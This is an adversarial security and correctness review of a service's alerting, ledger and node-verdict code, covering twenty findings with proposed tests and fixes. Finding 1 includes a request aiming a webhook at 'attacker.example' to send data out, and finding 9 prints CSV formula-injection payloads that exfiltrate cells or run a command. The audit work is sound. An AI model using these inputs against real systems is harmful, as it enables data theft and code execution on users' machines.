# Wave 5 · V — adversarial review: money and judgement paths

Repo `/Users/ruirui/orca/workspaces/tono/spookfish`, branch `ops/platform`, package
`services/control-plane`. Read-only pass. Every finding below was traced end to end in
the source; each is tagged **verified** (the code path alone settles it) or **plausible**
(the code says so but a runtime detail I could not exercise could change it).

Baseline: `npx vitest run test/ops-ledger.test.ts` → 11 passed. Nothing below is a
regression against the current suite; they are all gaps the suite does not cover. No new
test files were added (read-only brief), so the "narrowest test" lines are proposals, not
runs — the one exception is the ledger baseline above, which confirms that reverse-into-the-
current-month is deliberate and pinned (`test/ops-ledger.test.ts:217-239`), which is why
finding 2 is scoped to the *missing close guard* rather than to the month choice.

---

## P0

### 1. The alert-rule test endpoint bypasses the webhook host allowlist entirely
**`src/ops/handlers/alerts.ts:230-232`** (with `src/ops/verdict-run.ts:130`, `src/env.ts:69`) — **verified**

```ts
allowedHosts: (e as Env & { OPS_ALERT_ALLOWED_HOSTS?: string }).OPS_ALERT_ALLOWED_HOSTS
  ?? (() => { try { return new URL(String(rule.target)).hostname; } catch { return ''; } })(),
```

Two compounding problems:

1. `OPS_ALERT_ALLOWED_HOSTS` **does not exist**. The variable the rest of the system uses is
   `ALERT_WEBHOOK_ALLOWED_HOSTS` (`src/env.ts:69`, read at `src/ops/verdict-run.ts:130`, documented
   in `docs/ops/rollout-ops2.md:64`). `grep` over `src/`, `wrangler.jsonc`, `wrangler.fixtures.jsonc`
   and `.dev.vars.example` finds `OPS_ALERT_ALLOWED_HOSTS` **only** at this one line. So the `??`
   fallback is taken on every deployment, always.
2. The fallback derives the allowlist **from the rule's own target**. `isAllowedWebhookHost`
   (`src/ops/alerts.ts:128-140`) then checks `parsed.hostname` against a set built from that same
   hostname — it can never fail. For templates `generic`, `feishu` and `slack`, `shapePayload`
   returns `url: opts.target` (`src/ops/alerts-shape.ts:59-72, 94`), so the check is a tautology.

The comment at `src/ops/fx.ts:1-4` states the purpose of this list plainly: *"that list exists to
stop operator-configured webhook URLs from becoming an SSRF oracle."* The test path removes it.

**Input → wrong output.** `POST /ops/alert-rules` with `{channel:"webhook", template:"generic",
target:"https://attacker.example/collect"}` (no allowlist validation exists at write time —
`validateRuleBody`, `src/ops/handlers/alerts.ts:111-135`, checks channel/template/severity/fireOn/
secretRef and never touches `target`), then `POST /ops/alert-rules/<id>/test`. The Worker POSTs the
incident payload to `attacker.example`. Under the cron path the same rule is refused
(`webhook host is not allowlisted`), so the console shows a rule that "tests green" and then never
delivers — the operator's own probe lies to them *and* egresses to an arbitrary host.

Also reachable against internal-ish https endpoints the Worker can resolve; only `http:` is blocked
(`src/ops/alerts.ts:135`).

**Narrowest test.** `test/ops-alerts.test.ts`: create a rule with `target:
"https://not-allowlisted.example/hook"` while `ALERT_WEBHOOK_ALLOWED_HOSTS` is set to the default
three hosts, `POST .../test` with a stub fetch, and assert the stub was **not** called and the
delivery row ends `failed`/`suppressed` with `error` containing `not allowlisted`. It fails today.

---

## P1

### 2. `POST /ledger/:id/reverse` has no month-closed guard, and writes into the UTC current month
**`src/ops/handlers/ledger.ts:208-240`** (esp. `:217`) — **verified**

`postLedger` calls `requireOpenMonth` (`:152`) and `patchLedger` calls it (`:184`).
`postLedgerReverse` calls it **nowhere**. It also targets `const month = utcMonthString(t)` (`:217`)
— the current month, not the original's — which the suite pins as intended behaviour
(`test/ops-ledger.test.ts:217, 235`). Fine while the current month is open; nothing checks that it is.

**Input → wrong output.** The operator closes September on Sept 30 (`POST /months/2026-09/close`;
`ops_month_close` now has `2026-09`). Anyone hits `POST /ledger/<sept-entry>/reverse` before the
UTC month rolls. A −N CNY row lands in the **closed** month. `loadMonthSummary` recomputes revenue
from live rows (see finding 6), so `GET /months/2026-09` now returns a revenue figure different from
the one signed off in `ops_month_close.revenue_cny_minor`, with no `closedAt` change to hint at it.

The Asia/Shanghai skew makes this routine rather than exotic. `utcMonthString` is UTC, so between
00:00 and 08:00 Shanghai on the 1st of a month, `utcMonthString(now)` is still the *previous* month.
An operator clicking "reverse" at 02:00 Shanghai on Oct 1 writes into September — which they very
plausibly closed the evening before.

**Narrowest test.** In `test/ops-ledger.test.ts`, extend the existing
`'rejects PATCH after close and allows reverse into the current month'` case: close `MONTH()`
(the *current* month) as well, then reverse an entry and assert `409 MONTH_CLOSED`.

### 3. Concurrent (or double-clicked) reverse produces two reversal rows
**`src/ops/handlers/ledger.ts:211-235`** — **verified**

The guard is read-then-write across two round trips:

```ts
if (nullText(original.reversed_by)) throw new ApiError(409, 'ALREADY_REVERSED', ...);   // :211
...
await e.DB.batch([
  e.DB.prepare('UPDATE ... SET reversed_by = ? ... WHERE id = ? AND reversed_by IS NULL'), // :222
  e.DB.prepare('INSERT INTO ops_ledger_entries(... cny_minor = -original ...)'),           // :225
]);
```

The `UPDATE` is correctly conditional — but its `meta.changes` is never inspected, and the `INSERT`
in the same batch is **unconditional**. Two requests that both pass the `:211` read both insert.
The second `UPDATE` matches zero rows (so `reversed_by` still points at the first reversal, and the
original still looks singly-reversed) while a second `−cnyMinor` row exists.

**Input → wrong output.** ¥800 revenue entry; the console's reverse button double-fires (or the
operator retries a request that timed out). Ledger for the current month now carries `−800` twice.
`loadMonthSummary` → `addRevenue('revenue', −80000)` twice (`src/ops/ledger.ts:50-53, 116`) →
`revenueCnyMinor = −80000` instead of `0`. The month reports negative revenue and a negative
per-customer margin, and `GET /ledger/:id` on the original shows exactly one `reversedBy`, so the
duplicate is invisible from the entry the operator would inspect.

**Narrowest test.** `test/ops-ledger.test.ts`: post one revenue entry, fire two
`POST /ledger/<id>/reverse` calls with `Promise.all`, assert exactly one `201` and one `409`, and
assert `GET /months/<m>` has `revenueCnyMinor === 0`.

A guard that would actually hold: make the reversal `INSERT` conditional on the original
(`INSERT ... SELECT ... WHERE (SELECT reversed_by FROM ops_ledger_entries WHERE id=?) IS NULL`), or
key the reversal id deterministically off the original (`reverse:<entryId>`) so the PK rejects the
second.

### 4. A node the mainland sweep can't reach, whose Komari agent is alive, alerts *never*
**`src/ops/verdict.ts:245-259`** — **verified**

```ts
if (unreachable(node) && agentSilent(node.agentObservedAt, ctx.nowSec)) return 'down';
if (unreachable(node)) return 'unknown';                       // :250
if (node.ok === true && node.blockStatus === 'LIKELY_BLOCKED') return 'blocked';
...
if (degradedCause(node)) return 'degraded';                    // :253
```

`unknown` maps to no incident kind and no severity (`nodeKind`/`nodeSeverity`,
`src/ops/verdict.ts:287-301` both return `null`), so `desireForNode` returns `null` and no incident,
and therefore no alert, is ever produced. Hysteresis does not save it: `RANK.unknown(1) > RANK.ok(0)`
and `canEnter('unknown')` is `age >= 0` (`src/ops/verdict-hysteresis.ts:79`), so the node commits to
`unknown` on the first pass and stays.

The `:250` early return also sits **above** the degraded check at `:253`, so the customer-failure
and error-spike evidence is discarded for exactly the node that is failing hardest.

**Input → wrong output.** Node `hk-3`: the Reality inbound dies (firewall, xray crash, port
blackholed) but the box is up, so Komari reports `observedAt = now`. The mainland sweep returns
`ok:false` / `DOWN`. `unreachable` is true, `agentSilent` is false → verdict `unknown`, label
`路径未测`. Every customer on `hk-3` fails to connect; `fails30m` shows 40 attempts / 40 failures /
6 distinct users; `errorSpike` is set. Zero node incidents, zero alerts. The console shows
`路径未测`, indistinguishable from "the sweep hasn't run yet". Meanwhile the affected customers each
open their own `customer-repeat-fail` warns (`src/ops/verdict-customers.ts:129-143`) — and because
there is no severe node desire, `severeByNode` is empty, `demote` is false, and no
`parentDedupeKey` links them (`:90-101`). The operator gets six unparented customer warnings and
nothing pointing at the node.

**Narrowest test.** `test/ops-verdict.test.ts`: one node with `ok:false`, `blockStatus:'DOWN'`,
`agentObservedAt: nowSec - 60`, `fails30m:{attempts:40,failures:40,distinctUsers:6,handshakeDistinctUsers:6}`,
`catalogListed:true`, `occupancy:6`. Assert `output.desires` contains a node desire for it. Fails today.

The right shape is probably a `notice`/`warn` kind for "sources disagree" rather than silence — the
comment at `:247-249` argues correctly that neither `正常` nor `失联` is honest, then draws the wrong
conclusion (say nothing) instead of the honest one (say *that*).

### 5. A node the sweep never covered is reported `大陆正常`
**`src/ops/verdict-facts.ts:426-431`** with **`src/ops/verdict.ts:255-259`** — **verified**

```ts
ok: q ? q.ok === true : null,          // verdict-facts.ts:429
blockStatus: blockStatusOf(q),         // :430 → null when q is undefined
```

`names` (`src/ops/verdict-facts.ts:415-420`) is the union of sweep names, agent names, catalog names
and profile names. A node present in the catalog/agents but **absent from the quality sweep's node
list** gets `ok:null`, `blockStatus:null`. `unreachable()` is then false, `blocked` needs
`ok === true`, `no_probe` needs `agentObservedAt == null`. The freshness gate at `:255-258` checks
the **snapshot timestamps** (`qualitySweepAt`, `agentsSnapshotAt`), not per-node coverage — so if the
sweep ran recently for *other* nodes, this node falls through to `return 'ok'` → `大陆正常`.

**Input → wrong output.** A node is added to the catalog and to Komari but not to the hub's mainland
sweep list (or the sweep drops it after repeated timeouts). Sweep snapshot age 2h, agents snapshot
age 3min. The node reports `大陆正常` on the fleet page with **zero mainland measurements ever**, and
the operator sells it. The evidence blob (`src/ops/verdict.ts:327-337`) records `ok: null,
blockStatus: null` — the truth is in the evidence and contradicted by the label.

**Narrowest test.** `test/ops-verdict.test.ts`: node with `ok:null`, `blockStatus:null`,
`agentObservedAt: nowSec-60`, `catalogListed:true`, fresh `qualitySweepAt`/`agentsSnapshotAt`;
assert `verdict !== 'ok'` (should be `unknown`/`no_probe`). Fails today.

### 6. Closing a month freezes nothing that the API actually serves back
**`src/ops/ledger.ts:74-232`** and **`src/ops/handlers/ledger.ts:266-288`** — **verified**

`postMonthClose` writes `revenue_cny_minor`, `cost_cny_minor`, `margin_cny_minor`, `unreconciled`
into `ops_month_close` (`:275-283`). Grep across `src/` and `test/` for those columns: they are
**written and never read**. `loadMonthSummary` takes only `closed_at` / `closed_by` off the row
(`src/ops/ledger.ts:79-81, 217, 221-222`) and recomputes everything else live from
`customer_activity_hours`, `product_accounts`, `users` and `node_traffic_cycles` (`:82-97`).

**Input → wrong output.** August is closed on Sept 1 with `unreconciled: 0` and customer `u-a` at
`marginCnyMinor: 4200`. On Sept 3, the metering collector backfills August hours for `u-a` on node
`sg-1` (late cycle rows are normal — the queries at `:82-97` have no "written before close" filter).
`GET /months/2026-08` now returns a different `costCnyMinor` allocation for `u-a`, a different
`cnyPerGbMinor` for `sg-1`, and possibly `pending: true` / `unreconciled: 1`. The closed month
silently disagrees with the number the operator signed off, and the signed-off number is not
retrievable through any endpoint.

Revenue and cost totals themselves are protected (entries can't be added or patched into a closed
month — modulo finding 2), so this is specifically the per-customer allocation, per-node ¥/GB, and
the reconciliation count. Those are exactly the numbers the operator closes a month *for*.

**Narrowest test.** `test/ops-ledger.test.ts`: seed cycle + bytes, close the month, assert
`unreconciled === 0`; then insert extra `customer_activity_hours` rows in that month for an
un-costed node; re-`GET /months/<m>` and assert `unreconciled` and each `customers[].marginCnyMinor`
are unchanged from the close.

### 7. The rule test always fails for any rule that has a `secretRef`
**`src/ops/handlers/alerts.ts:229`** with **`src/ops/alerts.ts:340, 348`** — **verified**

`postAlertRuleTest` builds `sendEnv` with `secrets: {}` — hardcoded, never populated from the
environment the way `planAndSendAlerts` does (`src/ops/verdict-run.ts:122-127`). `sendPending` then
hits `if (row.secret_ref && !secret) throw new Error('secret ${...} is not available')`
(`src/ops/alerts.ts:348`).

**Input → wrong output.** Every `telegram` rule (whose bot token *is* the secret —
`src/ops/alerts-shape.ts:52`) and every signed `generic` webhook. The operator configures the rule
correctly, presses Test, and the delivery row records `failed` / `secret ALERT_TG_BOT is not
available`. Two bad outcomes, both live: they conclude the secret is missing and rotate/re-bind a
secret that was fine, or they conclude alerting is broken and stop trusting the console's alert page.
The inverse is worse — a rule that only works *without* a secret tests green, so the test signal is
anti-correlated with the property it is supposed to prove.

**Narrowest test.** `test/ops-alerts.test.ts`: rule with `secretRef: 'ALERT_TEST_HOOK'` and that
value bound in the test env; `POST .../test` with a stub fetch; assert the stub was called and the
delivery row is `sent`.

---

## P2

### 8. CSV export: the totals row sums across currencies and across kinds
**`src/ops/ledger.ts:246-265`** — **verified**

```ts
amount += entry.amountMinor;   // :251 — USD costs + CNY revenue, one number
cny    += entry.cnyMinor;      // :252 — revenue + refunds + costs, all positive
```

`signedCny`/`addRevenue` (`:46-54`) exist precisely because `cny_minor` is unsigned by kind, and
`ledgerCsv` ignores both. A month with ¥2,000 revenue, ¥300 refund and ¥1,400 of costs exports a
"total" of ¥3,700 in a row literally labelled `total`. The `amountMinor` total additionally adds
`1000` (US cents) to `20000` (CNY fen) and prints `21000`.

**Narrowest test.** Post one CNY revenue and one USD cost, `GET /months/<m>/export.csv`, assert the
total row's cny cell equals `revenue − cost`, and that the mixed-currency amount column is blank or
per-currency.

### 9. CSV export has no formula-injection guard
**`src/ops/ledger.ts:240-244`** — **verified**

`csvCell` quotes on `[",\n\r]` only. A `note` (free text, ≤500 chars, `parseNote`
`src/ops/handlers/ledger.ts:77-86`) or a `subjectId` (≤200 chars, only `[\r\n\0]` rejected, `:96-103`)
beginning `=`, `+`, `-`, `@` or a tab is emitted raw. `ledger-2026-09.csv` opened in Excel/WPS
executes `=HYPERLINK("https://x/?"&A2,"click")` or `=cmd|'/c calc'!A1`. The audience is the operator
and their accountant; `subjectId` in particular is not always operator-typed. Prefix-escape with a
leading `'` or `\t`, or quote-and-prefix.

**Narrowest test.** Post an entry with `note: '=1+1'`, export, assert the cell does not start with `=`.

### 10. `GET /ledger` silently truncates at 500 and reports the truncated count as the total
**`src/ops/handlers/ledger.ts:124-141`** — **verified**

The SQL is `... WHERE month = ? ORDER BY created_at DESC, id DESC LIMIT 500` (`:126`); pagination is
then done in memory over that slice, and the list envelope's total is `items.length` (`:140`),
capped at 500. Entry 501 of a month is unreachable through the API and the header count is wrong.
`getMonthExport` (`:295-297`) has no LIMIT, so the CSV and the list disagree. Push the cursor into
the SQL, or at minimum use `SELECT COUNT(*)` for the total.

### 11. `POST /months/:m/close` races itself into a 500
**`src/ops/handlers/ledger.ts:271-283`** — **verified**

`SELECT month FROM ops_month_close` then `INSERT` — not atomic. Two concurrent closes both read
nothing and both insert; the loser hits the `ops_month_close` PK
(`migrations/0053_ops_ledger.sql:36`) and surfaces as an unhandled D1 error (500), not the intended
`409 MONTH_CLOSED`. Same TOCTOU exists between `requireOpenMonth` (`:152`) and the entry INSERT
(`:165`), so a POST can slip into a month closed microseconds earlier. `INSERT OR IGNORE` +
`meta.changes` check fixes the first; the second wants the close to be the one that validates.

### 12. A second escalation on the same incident is silently dropped
**`src/ops/alerts.ts:113-122, 197-202`** — **verified**

`deliveryDedupeKey` is `${ruleId}:${incidentDedupeKey}:${transition}:${openedAt}` and the insert is
`INSERT OR IGNORE` against a UNIQUE index on `dedupe_key`
(`migrations/0041_ops_alerts.sql:66`). `openedAt` does not change while an incident stays open, so
two `escalate` transitions on the same incident collide and the second is dropped — and dropped
*silently*, since `result.pending` counts only rows where `meta.changes > 0` (`:207`).

Reachable for customer incidents, whose severity is genuinely mutable under a fixed dedupe key:
`customer-path-slow:<userId>` is `notice` when demoted under a severe node parent, else `warn`
(<800ms) or `severe` (≥800ms) — `src/ops/verdict-customers.ts:108-115`. Sequence: customer sits on a
down node → `notice` (open); node recovers → `warn` (escalate #1, alert sent); path degrades to
900ms → `severe` (escalate #2, **dropped**). A rule with `minSeverity: 'warn'` never hears that the
customer went severe. (A rule with `minSeverity:'severe'` is unaffected — it filtered out escalate #1.)
Include the severity, or a monotonic revision, in the delivery key.

### 13. Onboarding allowlists the email before it validates the profile fields
**`src/ops/legacy-handlers/users.ts:204-206`** vs **`:229` / `:288`** — **verified**

`INSERT OR IGNORE INTO signup_allowlist` runs first; `optionalWechatId(b.wechatId)`
(`:49-60`) is only evaluated later, inside the `.bind(...)` argument list, and throws
`400 VALIDATION_ERROR`. A wechatId with a newline or >64 chars returns 400 to the operator while the
email is **permanently allowlisted** — i.e. that address can now self-register. In the `user` branch
the same 400 arrives after `exitClientUUID` has already minted an exit identity (`:216`). Validate
the whole body before the first write.

**Narrowest test.** `POST /ops/users/onboard` with `{email, wechatId: 'a'.repeat(65)}`; assert 400
**and** `SELECT * FROM signup_allowlist WHERE email = ?` returns no row.

### 14. A flapping observation can pin a node in `pressure`/`degraded` forever
**`src/ops/verdict-hysteresis.ts:111-127`** — **plausible** (mechanism verified; how often the
observation actually alternates in production, I can't measure from here)

`candidateSince` is preserved only while `prior.candidateVerdict === observed` (`:111-113`).
`canExit` for the timed verdicts is `age >= spec.exitSeconds` (`:98`), and `age` is derived from
`candidateSince`. If the observation alternates between two non-committed values, `candidateSince`
resets to `nowSec` on every pass and `age` never exceeds 0, so `pressure` (exitSeconds 900) and
`degraded` (exitSeconds 900) never release.

Committed `pressure`; the agents snapshot is right at the 15-minute `AGENTS_STALE_SECONDS` edge, so
`observedVerdict` alternates `ok` / `unknown` between cron ticks. Neither can ever exit. The node
shows `高负载` indefinitely on a healthy box, and the desire keeps a `warn` incident open forever.
Track clean-streak age separately from candidate-identity age.

Related, cosmetic but confusing: `enterStreak: 2` (degraded) and `enterStreak: 3` (pressure) at
`:24-25` are dead config — `canEnter` (`:64-80`) only consults `streak` for `blocked`, everything
else is time-only.

### 15. A catalog decrypt failure silently disables `no_probe` and the retire suggestion
**`src/ops/verdict-facts.ts:60-72, 428`** — **verified**

`catalogNameSet` swallows every error and returns `null` (`:69-71`), which becomes
`catalogListed: null`. `no_probe` requires `catalogListed === true` (`src/ops/verdict.ts:252`) and
`suggestedJob: 'catalog_retire'` requires `catalogListed === true`
(`src/ops/verdict.ts:346`). So a bad `CATALOG_KEY` or a malformed catalog blob turns off the "in
sale with no probe" alarm and the "still in the customer catalog" retire nudge fleet-wide, with no
signal anywhere — the fleet just looks quieter. Distinguish "catalog unavailable" from "not listed",
and open a fleet incident for the former.

### 16. Alert-rule numeric fields are unvalidated
**`src/ops/handlers/alerts.ts:158-159, 186-196`** — **verified**

`Number(b.minImpact ?? 0)`, `Number(b.delaySeconds ?? 0)`, `Number(b.cooldownSeconds ?? 3600)` with
no range or NaN check in `validateRuleBody` (`:111-135`). `{"cooldownSeconds": -1}` disables the
cooldown (`nowSec - lastSent < -1` is false, `src/ops/alerts.ts:172`). `{"delaySeconds": 1e12}`
parks every delivery past the heat death of the outbox — `next_attempt_at` is in the future forever
and `sendPending`'s `WHERE next_attempt_at <= ?` never picks it up, so the rule looks enabled and
never fires. `{"minImpact": "abc"}` binds NaN. Also `secretRef: ''` passes `validateRuleBody`
(`:132`, the check is skipped for `''`) and then violates the DB CHECK
(`migrations/0041_ops_alerts.sql:34`) → 500 instead of 400.

### 17. `postAlertRuleTest` 500s if the same rule is tested twice within one second
**`src/ops/handlers/alerts.ts:225-228`** — **verified**

Plain `INSERT` (not `OR IGNORE`) with `dedupe_key = ${ruleId}:test:${t}`, `t` in whole seconds,
against `CREATE UNIQUE INDEX ops_alert_deliveries_dedupe` (`migrations/0041_ops_alerts.sql:66`).
A double-click on Test returns a 500. Use `deliveryId` in the key.

### 18. "Last fired" counts test sends
**`src/ops/handlers/alerts.ts:71-79`** with **`src/ops/alerts.ts:404-413`** — **verified**

A successful test writes `ops_alert_rule_state(rule_id, 'test:<ruleId>', last_sent_at)`, and
`lastFired` is `MAX(last_sent_at) ... WHERE rule_id = ?` across all dedupe keys. So the console's
"last fired" timestamp for a rule that has never delivered a real alert shows the last time someone
pressed Test. Exclude `test:` keys, or read the last non-test delivery.

### 19. `fails30m.attempts` for customers is a copy of `failures`
**`src/ops/verdict-facts.ts:293-296`** — **verified**

```ts
fails30m: { attempts: Number(row.fails_30m) || 0, failures: Number(row.fails_30m) || 0 },
```

Harmless today — `customerDesires` reads only `failures` (`src/ops/verdict-customers.ts:125`) — but
it is a loaded gun for anyone who later adds a ratio rule on the customer side (the node side
already has one, `customerFailRatio`, `src/ops/verdict.ts:210-213`, and it would read 100% failure
for every customer). Either populate `attempts` honestly or drop the field from
`CustomerFails30m`.

### 20. `amountMinor` has no upper bound
**`src/ops/handlers/ledger.ts:52-57`** — **verified**

`Number.isSafeInteger(value) && value >= 0` admits `9007199254740991`. `cnyMinorFrom` is
`Math.round(amountMinor * rate)` (`src/ops/fx.ts:71-73`), which at any FX rate > 1 leaves the safe
integer range — the stored `cny_minor` is then an approximation, and every subsequent
`revenueCnyMinor += ...` in `loadMonthSummary` compounds it. `month` is likewise unbounded
(`parseMonth` accepts `2099-12`). A sane cap (say ≤ 1e12 minor units, and a month within a couple of
years of now) turns a fat-finger into a 400 instead of a silently wrong book.

---

## Checked and clean (negative results, so nobody re-audits these)

- **CNY-only rule cannot be bypassed.** `currencyForKind` (`src/ops/handlers/ledger.ts:67-75`) runs
  after `kind` is validated by `oneOf`; `patchLedger`'s `rejectUnexpectedKeys` allows only
  `note`/`paidAt`/`subjectType`/`subjectId` (`:186`), so neither `kind` nor `currency` is mutable;
  `postLedgerReverse` copies both from the original (`:231-232`). No path produces a
  revenue/refund/credit entry in a non-CNY currency. (The DB has no CHECK backing this — worth
  adding as defence in depth, but there is no live hole.)
- **`secretRef` cannot read arbitrary env.** `envSecret` (`src/ops/verdict-run.ts:108-112`) gates on
  `/^ALERT_[A-Z0-9_]+$/`, so `RESEND_API_KEY`, `ADMIN_TOKEN` etc. are unreachable; the DB CHECK and
  `validateRuleBody` agree. `test/ops-alerts.test.ts:542` already pins it. Secrets do not reach
  `payload_sha256` either — for telegram the token lives in the URL, and the hash is over the body
  (`src/ops/alerts.ts:364`); for email the hash is over the body, not the `authorization` header.
- **The rule test does not drain real deliveries.** `sendPending`'s `AND (? IS NULL OR d.id = ?)`
  (`src/ops/alerts.ts:289`) is honoured and `postAlertRuleTest` passes `deliveryId`
  (`src/ops/handlers/alerts.ts:243`). The test's cooldown state also lands under a separate
  `test:<ruleId>` dedupe key, so it cannot suppress a real incident's alert. (It does pollute
  "last fired" — finding 18.)
- **Allowlist profile copy is case-insensitive and concurrency-safe.**
  `signup_allowlist.email` is `TEXT PRIMARY KEY COLLATE NOCASE` (`migrations/0012:5`) and
  `users.email` is `UNIQUE COLLATE NOCASE` (`migrations/0001:4`), so the `LEFT JOIN a ON a.email = ?`
  in `src/signup-profile.ts:17` matches under the column collation regardless of the casing the IdP
  hands back. The `INSERT OR IGNORE` + re-`SELECT ... WHERE email = ?` in `src/index.ts:1365-1371`
  converges correctly on concurrent first sign-ins. The `FROM (SELECT 1) LEFT JOIN` shape yields
  exactly one row (email is the PK), so it can neither insert twice nor insert zero rows.
- **Reversal arithmetic is sign-correct.** Copying `kind` and negating `cny_minor` composes properly
  with `signedCny`/`addRevenue` for all four kinds, including reversing a refund and reversing a
  reversal. Only the *month* it lands in and the missing close guard are wrong (finding 2).
- **`fetchAndStoreFxRates` / `lookupRate` day selection is honest.** `lookupRate`'s
  `day <= ? ORDER BY day DESC LIMIT 1` (`src/ops/fx.ts:98-103`) returns the newest rate at or before
  the requested day, and the handler stores the *returned* `stored.day` as `fx_date`
  (`src/ops/handlers/ledger.ts:114, 173`) — not the requested day. A missing rate is a clean
  `409 FX_RATE_MISSING`, not a silent 1.0. The UTC/Shanghai skew shifts which day's ECB rate is used
  by at most one publication, and the row records which one honestly.
- **Retired nodes do not open incidents.** `evaluate` filters `profileStatus === 'retired'`
  (`src/ops/verdict.ts:376-379`), `ops_node_profiles.status` is CHECK-constrained to
  `('active','retired')` with a UNIQUE index on `catalog_name`
  (`migrations/0023_ops_management.sql:67, 78`), and the node is still evaluated and persisted for the
  node page as the comment claims. (Their *customers* still open unparented incidents, since there is
  no severe node desire to demote against — same mechanism as finding 4, second order.)
- **Scoped verdict passes do not mass-resolve other subjects' incidents.** The `carried` flag
  (`src/ops/verdict-facts.ts:347`) puts untouched incidents into `desiredKeys` and
  `reconcileIncidents` skips rewriting them (`src/ops/evaluate.ts:269`), for both the
  single-customer scope and `scope: 'none'`. `INSERT INTO ops_incidents` exists in exactly one place
  (`src/ops/evaluate.ts:277`), so there are no console-created incidents for a pass to clear.
- **Incident dedupe keys do not collide across subjects.** Node keys are `<kind>:<nodeName>` with
  kind prefixes (`node-down`, `node-blocked`, …), customer keys are `customer-<rule>:<userId>`, and
  the fleet key is the constant `fleet-collector-stale`. No node name or user id can produce another
  namespace's prefix.
- **`sendPending`'s claim is a correct optimistic lock.** `UPDATE ... WHERE id = ? AND status =
  'pending' AND attempts = ?` + `meta.changes !== 1 → continue` (`src/ops/alerts.ts:301-305`), and
  every follow-up write re-asserts `attempts`. Two concurrent drains cannot both send the same row.
  Email carries `idempotency-key: <delivery id>` (`:260`); webhooks are at-least-once by
  construction (a crash between a successful POST and the status write re-sends after backoff),
  which is the normal outbox tradeoff, not a defect.

---

## The three I would fix first

1. **Finding 1 (P0) — the rule test's allowlist bypass.** It is a one-line typo
   (`OPS_ALERT_ALLOWED_HOSTS` → `ALERT_WEBHOOK_ALLOWED_HOSTS`) plus deleting the
   derive-from-target fallback, and it currently turns the admin console into an arbitrary-https-POST
   primitive while making an unroutable rule look healthy. Cheapest fix, largest blast radius.
   Fold finding 7 (`secrets: {}`) into the same change so the test path is a faithful dry run of
   the cron path — same allowlist, same secrets, same code.
2. **Findings 2 + 3 (P1) — reverse.** Both are in one 30-line function and both put a wrong number
   in the book: a reversal that lands in a closed month, and a double-fire that doubles the
   negative. Add `requireOpenMonth(e.DB, month)` after `:217`, and make the reversal INSERT
   conditional on the original's `reversed_by` (or key the reversal id off the original) so the
   guard survives concurrency.
3. **Finding 4 (P1) — the silent `unknown`.** A node whose inbound is dead while its box is alive is
   the single most likely real outage shape, and today it produces no incident, no alert, and a
   label that reads as "not yet measured". It also swallows the customer-failure and error-spike
   evidence by returning above the `degraded` check. Give the sources-disagree state its own kind and
   severity, and move the `:250` return below `:253`.

Finding 5 is a close fourth and shares a fix window with 4 — both are about the engine calling a
node's state more confidently than the evidence supports, in opposite directions.

---

## 转交 B

Finding 13 was fixed for the *validation* failures — `optionalWechatId` and friends now run before
the first write. The same shape survives on two later failure paths in the same handler, and both
are in a B-owned file (`services/control-plane/src/ops/legacy-handlers/users.ts`), so D is handing
them over rather than editing it.

**Where.** `INSERT OR IGNORE INTO signup_allowlist` is still the first write of the request
(`services/control-plane/src/ops/legacy-handlers/users.ts:222`), and for an already-registered
address `exitClientUUID` mints an exit identity immediately after it (`:233`). Everything that can
still refuse the request runs *after* both.

**Repro A — an unknown `productAccountId`.**
For an address already in `users`, `POST /api/v1/ops/users/onboard` with
`{ "email": "<that address>", "productAccountId": "no-such-account" }`. The handler reaches the
pooled-account branch, `SELECT account_ref FROM product_accounts WHERE id = ?` finds nothing, and
it throws `404 NOT_FOUND` (`:287`). The operator sees a 404 and reads it as "nothing happened".
On disk, `SELECT * FROM signup_allowlist WHERE email = ?` returns a row, and that user now has an
exit identity minted at `:233`.

**Repro B — a home line that will not assign.**
For the same registered address, `POST /api/v1/ops/users/onboard` with
`{ "email": "<that address>", "line": "<a line the assign refuses>" }`.
`sharedAdministrativeResource(..., 'home-exits/assign', ...)` answers not-ok and the handler throws
`HOME_ASSIGN_FAILED` (`:264`) — again after `:222` and `:233`. Same end state:
a refusal to the operator, an allowlisted email and a minted exit identity on disk.

**Expected.** A refused onboard leaves nothing behind: no `signup_allowlist` row for that address
(unless one existed before the request), and no exit identity minted for that user. The operator
retries with the right account id or the right line and the second attempt is the first write.

**Proposed fix.** Resolve everything the request depends on before the first write — the pooled
`product_accounts` row for `productAccountId`, and the home-line assign — and only then insert the
allowlist row and mint the identity. Where the assign genuinely cannot be moved ahead of the write
(it is a nested request), wrap the handler so a throw after `:222` compensates: delete the
`signup_allowlist` row this request inserted (`INSERT OR IGNORE` means "this request inserted it"
has to be read off `meta.changes`, not assumed) and drop the exit identity minted at `:233`.

**Narrowest test (B's to write).** `POST /ops/users/onboard` for a registered address with
`productAccountId: 'no-such-account'`; assert 404 **and** `SELECT * FROM signup_allowlist WHERE
email = ?` returns no row **and** no exit identity exists for that user. The `HOME_ASSIGN_FAILED`
path takes the same three assertions with a stubbed assign that refuses.
